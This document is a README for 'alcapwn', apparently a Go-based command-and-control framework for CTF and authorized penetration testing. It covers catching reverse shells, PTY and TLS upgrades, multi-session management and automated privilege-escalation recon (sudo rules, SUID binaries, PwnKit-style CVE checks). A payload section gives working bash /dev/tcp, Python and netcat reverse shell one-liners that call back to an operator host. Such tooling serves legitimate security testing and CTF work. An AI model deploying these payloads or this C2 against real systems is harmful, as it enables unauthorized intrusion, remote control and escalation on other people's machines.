<p align="center">
  <img src="alcapwn_logo.png" alt="alcapwn" width="400">
<br />
CLI-based C2 framework for CTF and authorized penetration testing. Catches reverse shells, upgrades them to PTY, runs automated recon, and manages multiple sessions from an interactive operator shell.
</p>

## Quick Start

```bash
go build -o alcapwn
./alcapwn -l 0.0.0.0:4444
```

Then from the operator shell:

```
alcapwn> listen 0.0.0.0:5555    # start additional listeners
alcapwn> sessions                # list active sessions
alcapwn> use 1                   # attach interactively (Ctrl+D to background)
alcapwn> info 1                  # print full recon summary
alcapwn> tls 1                   # upgrade session to TLS in-place
```

## Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/<ip>/4444 0>&1

# Python
python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("<ip>",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/bash")'

# Netcat
nc -e /bin/sh <ip> 4444
```

## Operator Shell

alcapwn drops into an interactive prompt after launch. All session management happens here — no need to restart between connections.

```
  LISTENERS
    listen <host:port>       Start a new TCP listener
    listeners                List active listeners
    unlisten <port|addr>     Stop a listener

  SESSIONS
    sessions                 List all active sessions
    use <id>                 Attach to a session interactively (Ctrl+D to background)
    kill <id>                Terminate a session
    rename <id> <name>       Label a session for easier tracking
    tls <id>                 Upgrade a plain session to TLS encryption
    fp [id]                  Show TLS certificate fingerprint
    reset <id>               Respawn a new shell from session, close old one
    info <id>                Print full recon summary
    export <id> [path]       Save findings JSON to disk
    broadcast <cmd>          Send a command to all active sessions

  OPERATOR
    help                     Show command list
    exit                     Exit (prompts if sessions are active)
```

Arrow keys and command history are supported at the operator prompt.

## Session Lifecycle

```
[target connects]
    ↓
[+] Session [1] opened — 192.168.1.50:54312
    ↓  PTY upgrade (spinner)
    ↓  TLS reconnect (if --tls or 'tls 1')
    ↓  Automated recon (silent)
[+] Session 1 ready
alcapwn>
```

Sessions are backgrounded after recon completes. Use `use <id>` to attach interactively. `Ctrl+D` backgrounds the session; `Ctrl+C` is forwarded to the remote shell.

## Automated Recon

On each new session alcapwn silently runs recon and stores findings in memory:

- Identity, OS, kernel version
- Sudo NOPASSWD rules
- SUID/SGID binaries matched against GTFOBins
- CVE candidates (PwnKit, Baron Samedit, sudo bypass)
- Linux capabilities, writable cron paths, interesting files
- Running services and version strings

Results are accessible via `info <id>` and `sessions`. Findings stay in memory until the session is killed.

## Flags

```
  -l HOST:PORT     Start a listener on launch
  -T / --tls       Automatic TLS on all sessions (ephemeral cert)
  -n / --no-recon  Skip recon — connect straight to interactive shell
  -t SEC           Per-section recon timeout, seconds (default 15, range 5–300)
  -o DIR           Save findings JSON to DIR (off by default)
  -r DIR           Save raw terminal capture to DIR (off by default)
  -v / -v=1 / -v=2 Verbosity (default quiet; 1 = status messages; 2 = debug)
```

`-o` and `-r` are independent — point them at the same directory or different ones.

## TLS

```bash
# Auto-TLS on all sessions:
./alcapwn --tls -l 0.0.0.0:4444

# Upgrade a specific session manually:
alcapwn> tls 1

# Verify the certificate in use:
alcapwn> fp
alcapwn> fp 1
```

alcapwn generates an ephemeral self-signed cert per run. The Python TLS relay on the target asserts the SHA-256 fingerprint before connecting, preventing MITM. Use `fp` to retrieve the fingerprint for out-of-band verification.

## Security Notes

alcapwn defends against pbsh-style attacks (ANSI fragmentation, nonce reflection, DCS/PM injection). See `alcapwn_manual.md` for details.

## License

MIT — **Pwn responsibly.** Always have explicit written permission.
